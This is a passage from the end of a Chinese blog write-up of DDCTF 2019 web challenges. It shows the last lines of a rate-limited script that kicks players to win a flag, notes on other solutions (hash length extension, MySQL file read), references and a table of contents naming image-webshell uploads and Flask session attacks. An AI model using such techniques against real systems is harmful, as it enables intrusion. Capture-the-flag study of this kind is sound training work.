delete_robot(player_id,player_ticket)           <span class="comment">#使用主账户删除id</span></span><br><span class="line">    time.sleep(<span class="number">0.3</span>)                                 <span class="comment">#短暂休眠避免被封</span></span><br></pre></td></tr></table></figure>

<p>踢完所有人就会显示flag：</p>
<p><img src="https://i.loli.net/2019/07/11/5d2617323c0f143580.png" alt="flag效果"></p>
<h3 id="Hash拓展长度攻击"><a href="#Hash拓展长度攻击" class="headerlink" title="Hash拓展长度攻击"></a>Hash拓展长度攻击</h3><p>这也是在先知上看到的另外一种解法，暂时还没有去研究。</p>
<h3 id="Mysql弱口令读取"><a href="#Mysql弱口令读取" class="headerlink" title="Mysql弱口令读取"></a>Mysql弱口令读取</h3><p>这属于非预期了，Mysql那题可以实现任意文件读取，听说可以读出吃鸡flag (Mysql那题还不会…)</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://cdusec.happyhacking.top/?post=49" target="_blank" rel="noopener">CDUSec</a></p>
<p><a href="https://www.ctfwp.com/articals/2019ddctf.html#web%E7%AD%BE%E5%88%B0%E9%A2%98" target="_blank" rel="noopener">CTF Writeup</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/introduction" target="_blank" rel="noopener">CTF Wiki</a></p>
<p><a href="https://xz.aliyun.com/t/2657#toc-16" target="_blank" rel="noopener">upload-labs pass-16详解 by Yang</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">客户端session导致的安全问题 by leavesongs</a></p>
<p><a href="https://www.zhaoj.in/read-5269.html" target="_blank" rel="noopener">DDCTF Web部分wp by zhaoj</a></p>
<p><a href="https://xz.aliyun.com/t/4843" target="_blank" rel="noopener">DDCTF2019 两道web题解 by sm1le</a></p>
<p><a href="https://xz.aliyun.com/t/4849" target="_blank" rel="noopener">DDCTF Web Writeup by evoA</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>DDCTF的Web基本就到这了，还差一个很有意思的Mysql客户端任意文件读取没能复现出来，有点难受。</p>
<p>总算是复现完了<del>并没有</del>，学到了很多。</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Web/" rel="tag"># Web</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/07/03/%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E8%B5%9B/" rel="next" title="安恒六月赛(未完成)">
                <i class="fa fa-chevron-left"></i> 安恒六月赛(未完成)
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/07/08/Linux%E4%B8%8B%E5%AE%89%E8%A3%85sqli-labs%E5%92%8Cupload-labs/" rel="prev" title="Linux下安装sqli-labs与upload-labs">
                Linux下安装sqli-labs与upload-labs <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.jpg"
                alt="sketch_pl4ne" />
            
              <p class="site-author-name" itemprop="name">sketch_pl4ne</p>
              <p class="site-description motion-element" itemprop="description">wym</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">26</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.zhaoj.in/" title="glzjin" target="_blank">glzjin</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://lihuaiqiu.github.io/" title="离怀秋" target="_blank">离怀秋</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.cnblogs.com/wfzWebSecuity/" title="tr1ple" target="_blank">tr1ple</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://southsea.st/" title="南溟" target="_blank">南溟</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#滴"><span class="nav-number">2.</span> <span class="nav-text">滴~</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web签到题"><span class="nav-number">3.</span> <span class="nav-text">Web签到题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#获取源码"><span class="nav-number">3.1.</span> <span class="nav-text">获取源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#审计源码"><span class="nav-number">3.2.</span> <span class="nav-text">审计源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用源码"><span class="nav-number">3.3.</span> <span class="nav-text">利用源码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Upload-IMG"><span class="nav-number">4.</span> <span class="nav-text">Upload-IMG</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#上传gif图片马"><span class="nav-number">4.1.</span> <span class="nav-text">上传gif图片马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传png图片马"><span class="nav-number">4.2.</span> <span class="nav-text">上传png图片马</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#png文件组成"><span class="nav-number">4.2.1.</span> <span class="nav-text">png文件组成</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#chunk数据块"><span class="nav-number">4.2.2.</span> <span class="nav-text">chunk数据块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据块结构"><span class="nav-number">4.2.3.</span> <span class="nav-text">数据块结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IHDR"><span class="nav-number">4.2.4.</span> <span class="nav-text">IHDR</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PLTE"><span class="nav-number">4.2.5.</span> <span class="nav-text">PLTE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IDAT"><span class="nav-number">4.2.6.</span> <span class="nav-text">IDAT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IEND"><span class="nav-number">4.2.7.</span> <span class="nav-text">IEND</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写入php代码"><span class="nav-number">4.2.8.</span> <span class="nav-text">写入php代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传jpg格式图片马"><span class="nav-number">4.3.</span> <span class="nav-text">上传jpg格式图片马</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#homebrew-event-loop"><span class="nav-number">5.</span> <span class="nav-text">homebrew event loop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#审计源码-1"><span class="nav-number">5.1.</span> <span class="nav-text">审计源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关键逻辑"><span class="nav-number">5.2.</span> <span class="nav-text">关键逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flask-cookie-session"><span class="nav-number">5.3.</span> <span class="nav-text">Flask cookie-session</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#大吉大利，今晚吃鸡"><span class="nav-number">6.</span> <span class="nav-text">大吉大利，今晚吃鸡</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#整数溢出"><span class="nav-number">6.1.</span> <span class="nav-text">整数溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脚本踢人"><span class="nav-number">6.2.</span> <span class="nav-text">脚本踢人</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hash拓展长度攻击"><span class="nav-number">6.3.</span> <span class="nav-text">Hash拓展长度攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mysql弱口令读取"><span class="nav-number">6.4.</span> <span class="nav-text">Mysql弱口令读取</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">7.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">8.</span> <span class="nav-text">总结</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">sketch_pl4ne</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">36.8k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i> 访客数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      人
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i> 总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  









  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/three/three.min.js"></script>
  

  
  
    <script type="text/javascript" src="/lib/three/three-waves.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  

</body>
</html>
